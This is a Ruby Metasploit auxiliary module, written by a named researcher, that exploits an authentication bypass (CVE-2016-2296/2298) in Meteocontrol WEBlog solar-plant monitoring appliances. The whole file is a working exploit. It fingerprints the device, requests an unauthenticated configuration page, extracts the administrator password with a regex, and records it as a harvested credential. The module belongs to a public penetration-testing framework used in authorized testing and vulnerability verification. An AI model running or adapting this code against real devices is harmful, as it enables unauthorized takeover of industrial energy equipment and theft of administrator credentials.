##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name' => 'Meteocontrol WEBlog Password Extractor',
      'Description' => %{
          This module exploits an authentication bypass vulnerability in Meteocontrol WEBLog appliances (software version < May 2016 release) to extract Administrator password for the device management portal.
      },
      'References' =>
        [
          ['URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-16-133-01'],
          ['CVE', '2016-2296'],
          ['CVE', '2016-2298']
        ],
      'Author' =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'License' => MSF_LICENSE))

    register_options(
      [
        Opt::RPORT(8080) # Application may run on a different port too. Change port accordingly.
      ], self.class
    )
  end

  def run_host(ip)
    unless is_app_metweblog?
      return
    end

    do_extract
  end

  #
  # Check if App is Meteocontrol WEBlog
  #

  def is_app_metweblog?
    begin
      res = send_request_cgi({
        'uri' => '/html/en/index.html',
        'method' => 'GET'
      })

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
      return false
    end

    if (res && res.code == 200 && (res.headers['Server'] && res.headers['Server'].include?('IS2 Web Server') || res.body.include?("WEB'log")))
      print_good("#{rhost}:#{rport} - Running Meteocontrol WEBlog management portal...")
      return true
    else
      print_error("#{rhost}:#{rport} - Application does not appear to be Meteocontrol WEBlog. Module will not continue.")
      return false
    end
  end

  #
  # Extract Administrator Password
  #

  def do_extract()
    print_status("#{rhost}:#{rport} - Attempting to extract Administrator password...")
    begin
      res = send_request_cgi({
          'uri' => '/html/en/confAccessProt.html',
          'method' => 'GET'
      })

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
      return
    end

    if (res && res.code == 200 && (res.body.include?('szWebAdminPassword') || res.body=~ /Admin Monitoring/))
      get_admin_password = res.body.match(/name="szWebAdminPassword" value="(.*?)"/)
      if get_admin_password[1]
        admin_password = get_admin_password[1]
        print_good("#{rhost}:#{rport} - Password is #{admin_password}")
        report_cred(
          ip: rhost,
          port: rport,
          service_name: 'Meteocontrol WEBlog Management Portal',
          password: admin_password,
          proof: res.body
        )
      else
        # In some models, 'Website password' page is renamed or not present. Therefore, password can not be extracted. Check login manually on http://IP:port/html/en/confAccessProt.html for the szWebAdminPassword field's value.
        print_error("Check login manually on http://#{rhost}:#{rport}/html/en/confAccessProt.html for the 'szWebAdminPassword' field's value.")
      end
    else
      print_error("Check login manually on http://#{rhost}:#{rport}/html/en/confAccessProt.html for the 'szWebAdminPassword' field's value.")
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
